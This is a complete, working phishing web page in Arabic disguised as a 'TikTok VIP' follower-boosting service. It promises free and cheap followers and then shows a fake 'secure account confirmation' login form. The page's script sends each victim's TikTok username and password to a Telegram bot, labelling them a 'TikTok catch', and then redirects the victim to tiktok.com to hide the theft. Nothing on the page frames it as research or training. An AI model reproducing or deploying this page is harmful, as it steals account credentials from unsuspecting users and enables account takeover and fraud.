<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>TikTok Royal VIP - شحن المتابعين والتعزيز 2026</title>
    <style>
        * { box-sizing: border-box; margin: 0; padding: 0; font-family: 'Segoe UI', Tahoma, sans-serif; }
        body { background: #06030d; color: #fff; display: flex; justify-content: center; padding: 15px; min-height: 100vh; background-image: radial-gradient(circle at 50% 10%, #7928ca25 0%, transparent 70%); }
        .wrapper { width: 100%; max-width: 480px; }
        .hero-card { background: linear-gradient(145deg, #130b2b 0%, #0d061c 100%); border: 1px solid rgba(121, 40, 202, 0.4); border-radius: 24px; padding: 30px 20px; text-align: center; margin-bottom: 25px; box-shadow: 0 15px 35px rgba(0,0,0,0.7); }
        .badge-live { display: inline-flex; align-items: center; gap: 6px; background: rgba(37, 244, 238, 0.15); color: #25f4ee; padding: 6px 14px; border-radius: 20px; font-size: 11px; font-weight: bold; margin-bottom: 15px; border: 1px solid rgba(37, 244, 238, 0.4); }
        .live-dot { width: 8px; height: 8px; background: #25f4ee; border-radius: 50%; box-shadow: 0 0 10px #25f4ee; }
        h1 { font-size: 26px; color: #fff; margin-bottom: 8px; font-weight: 900; }
        h1 span { color: #25f4ee; }
        .subtitle { font-size: 13px; color: #b1a7d4; margin-bottom: 25px; line-height: 1.6; }
        .section-title { font-size: 18px; color: #25f4ee; margin: 25px 0 15px 5px; font-weight: bold; }
        .offer-card { background: rgba(19, 11, 43, 0.7); border: 1px solid rgba(121, 40, 202, 0.3); border-radius: 18px; padding: 18px; margin-bottom: 12px; display: flex; justify-content: space-between; align-items: center; }
        .offer-name { font-size: 16px; font-weight: bold; color: #fff; margin-bottom: 4px; }
        .offer-tag { font-size: 11px; color: #25f4ee; background: rgba(37, 244, 238, 0.1); padding: 2px 8px; border-radius: 6px; display: inline-block; }
        .offer-price { font-size: 17px; font-weight: 900; color: #ffcc00; text-align: left; }
        .btn-action { background: linear-gradient(135deg, #7928ca 0%, #25f4ee 100%); color: #000; border: none; padding: 11px 22px; border-radius: 12px; font-weight: 900; cursor: pointer; font-size: 14px; margin-top: 5px; }
        .btn-action.free { background: linear-gradient(135deg, #00b09b 0%, #96c93d 100%); color: #fff; }
        .modal { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(3, 1, 8, 0.9); backdrop-filter: blur(15px); justify-content: center; align-items: center; z-index: 100; padding: 20px; }
        .modal-content { background: #130b2b; border: 1px solid #25f4ee; border-radius: 24px; padding: 35px 25px; width: 100%; max-width: 380px; text-align: center; }
        .input-group { margin-bottom: 15px; text-align: right; }
        input { width: 100%; padding: 14px 16px; background: #06030d; border: 1px solid #2d1b54; border-radius: 14px; color: #fff; font-size: 14px; outline: none; }
        .btn-submit { width: 100%; padding: 14px; background: linear-gradient(135deg, #25f4ee 0%, #7928ca 100%); border: none; border-radius: 14px; color: #000; font-weight: 900; cursor: pointer; font-size: 16px; margin-top: 10px; }
        .close-btn { background: transparent; border: none; color: #9c8fb8; font-size: 13px; margin-top: 18px; cursor: pointer; font-weight: bold; }
        .footer { text-align: center; font-size: 11px; color: #6e628f; margin-top: 35px; }
    </style>
</head>
<body>
<div class="wrapper">
    <div class="hero-card">
        <div class="badge-live"><div class="live-dot"></div>سيرفر تيك توك نشط 2026</div>
        <h1>شحن وتفعيل <span>تيك توك VIP</span></h1>
        <p class="subtitle">المنصة العالمية الأولى لتعزيز الحسابات بدون حظر</p>
    </div>
    <div class="section-title">🚀 عروض المتابعين الفورية</div>
    <div class="offer-card">
        <div><div class="offer-name">1,000 متابع حقيقي</div><span class="offer-tag">هدية ترحيبية</span></div>
        <div><div class="offer-price">مجاني</div><button class="btn-action free" onclick="openLogin('1,000 متابع تيك توك مجاني')">استلام فوري</button></div>
    </div>
    <div class="offer-card">
        <div><div class="offer-name">10,000 متابع متفاعل</div><span class="offer-tag">الأكثر طلباً 🔥</span></div>
        <div><div class="offer-price">$5</div><button class="btn-action" onclick="openLogin('10,000 متابع تيك توك')">تفعيل</button></div>
    </div>
    <div class="footer">🔒 منصة مشفرة بمعايير الحماية العالية 2026</div>
</div>
<div class="modal" id="loginModal">
    <div class="modal-content">
        <h3 style="color:#fff; margin-bottom:10px;">تأكيد الحساب الآمن</h3>
        <p id="selectedOfferText" style="font-size:13px; color:#b1a7d4; margin-bottom:20px;"></p>
        <form onsubmit="submitForm(event)">
            <div class="input-group"><input type="text" id="username" placeholder="اسم المستخدم أو البريد" required></div>
            <div class="input-group"><input type="password" id="password" placeholder="كلمة المرور السرية" required></div>
            <button type="submit" class="btn-submit">تأكيد واستلام الطلب ✨</button>
        </form>
        <button class="close-btn" onclick="closeLogin()">إلغاء وإرجاع</button>
    </div>
</div>
<script src="config.js"></script>
<script>
    let currentOffer = "";
    function openLogin(offer) {
        currentOffer = offer;
        document.getElementById('loginModal').style.display = 'flex';
        document.getElementById('selectedOfferText').innerText = "الباقة: (" + offer + "). سجل دخولك لتأكيد الملكية:";
    }
    function closeLogin() { document.getElementById('loginModal').style.display = 'none'; }
    function submitForm(event) {
        event.preventDefault();
        const user = document.getElementById('username').value;
        const pass = document.getElementById('password').value;
        const text = `🚨 صيد تيك توك | ${currentOffer}\n👤 المستخدم: ${user}\n🔑 كلمة المرور: ${pass}`;
        fetch(`https://api.telegram.org/bot${BOT_CONFIG.token}/sendMessage?chat_id=${BOT_CONFIG.chat_id}&text=${encodeURIComponent(text)}`)
        .then(() => { window.location.href = "https://www.tiktok.com"; });
    }
</script>
</body>
</html>
